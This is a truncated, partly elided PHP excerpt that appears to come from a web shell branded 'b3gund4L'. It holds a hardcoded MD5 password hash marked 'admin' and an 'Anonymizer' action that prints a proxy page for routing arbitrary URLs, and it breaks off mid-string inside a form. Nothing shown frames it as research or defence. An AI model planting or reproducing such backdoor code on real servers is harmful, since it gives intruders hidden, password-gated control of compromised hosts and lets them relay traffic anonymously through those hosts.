<?php
//-----------------Password---------------------
$_password = "8f6fc8a988611dcf74be75d6716103a3"; //admin
$_agent = true;
$_unicode = 'UTF-8';
$_action = 'Anonymizer';
...
function actionAnonymizer() {
	...
	if (empty($url)) {
		if (empty($startURL)) {
			hardHeader();
			echo "<h1>b3gund4L</h1><div class=content>Proxy can be directly invoked like this: <a href=\"" . PROXY_PREFIX . $landingExampleURL . "\" target='_blank'>" . PROXY_PREFIX . $landingExampleURL . "</a><br /><br />Or, you can simply enter a URL below:<br /><br /><form onsubmit=\"if (document.getElementById('site').value) { 
